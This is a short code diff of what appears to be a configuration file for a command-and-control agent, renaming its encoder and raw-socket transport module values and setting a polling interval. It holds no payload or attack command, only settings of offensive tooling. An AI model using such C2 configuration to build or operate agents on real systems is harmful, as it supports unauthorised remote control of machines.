@@ -56,8 +56,8 @@ C2_ARCH = "x86"
 # How long to wait (in seconds) before polling the server for new tasks/responses
 IDLE_TIME = 5
 
-ENCODER_MODULE = "base64"
-TRANSPORT_MODULE = "raw_socket"
+ENCODER_MODULE = "encoder-base64"
+TRANSPORT_MODULE = "transport-raw_socket"
 
 ###########################################
 # DEBUG: </END GHETTO CONFIG>
